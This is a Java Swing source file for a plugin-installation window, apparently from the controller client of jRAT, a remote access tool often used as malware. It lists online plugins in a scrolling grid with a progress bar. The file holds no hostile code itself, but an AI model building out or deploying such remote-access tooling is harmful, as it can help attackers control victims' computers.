package su.jrat.client.ui.frames;

import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Toolkit;
import java.util.List;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;

import su.jrat.client.addons.OnlinePlugin;
import su.jrat.client.ui.panels.PluginPanel;
import javax.swing.JProgressBar;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JLabel;

@SuppressWarnings("serial")
public class FrameInstallPlugins extends JFrame {

	private JPanel contentPane;
	private JPanel panelGrid;
	private JScrollPane panel_1;
	public JProgressBar progressBar;
	public JLabel lblStatus;

	public FrameInstallPlugins() {
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameInstallPlugins.class.getResource("/icons/plugin.png")));
		setTitle("Plugin");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 640, 425);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		panel_1 = new JScrollPane();
		
		progressBar = new JProgressBar();
		progressBar.setVisible(false);
		
		lblStatus = new JLabel("Status");
		lblStatus.setVisible(false);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 471, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(lblStatus, GroupLayout.PREFERRED_SIZE, 108, GroupLayout.PREFERRED_SIZE)
					.addContainerGap())
				.addComponent(panel_1, GroupLayout.DEFAULT_SIZE, 614, Short.MAX_VALUE)
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGap(71)
					.addComponent(panel_1, GroupLayout.DEFAULT_SIZE, 271, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING, false)
						.addComponent(lblStatus, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
						.addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 28, Short.MAX_VALUE)))
		);
		
		panelGrid = new JPanel();
		panel_1.setViewportView(panelGrid);
		contentPane.setLayout(gl_contentPane);
		
		GridBagLayout gbl_panelGrid = new GridBagLayout();
		gbl_panelGrid.columnWidths = new int[] { 0, 0 };
		gbl_panelGrid.rowHeights = new int[] { 0, 0 };
		gbl_panelGrid.columnWeights = new double[] { 0.0, Double.MIN_VALUE };
		gbl_panelGrid.rowWeights = new double[] { 0.0, Double.MIN_VALUE };
		panelGrid.setLayout(gbl_panelGrid);
		
		loadPlugins();
	}

	public void loadPlugins() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					List<OnlinePlugin> list = OnlinePlugin.getAvailablePlugins();
					
					for (OnlinePlugin op : list) {
						PluginPanel pp = new PluginPanel(FrameInstallPlugins.this, op);
						
						addPluginPanel(pp);
						panelGrid.repaint();
						panelGrid.validate();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}	
		}).start();
	}
	
	public void addPluginPanel(PluginPanel panel) {
		GridBagConstraints grid = new GridBagConstraints();
		grid.gridx = 0;
		grid.gridy = panelGrid.getComponentCount();
		panelGrid.add(panel, grid);
		
		panel.setIndex(panelGrid.getComponentCount() - 1);
	}
}
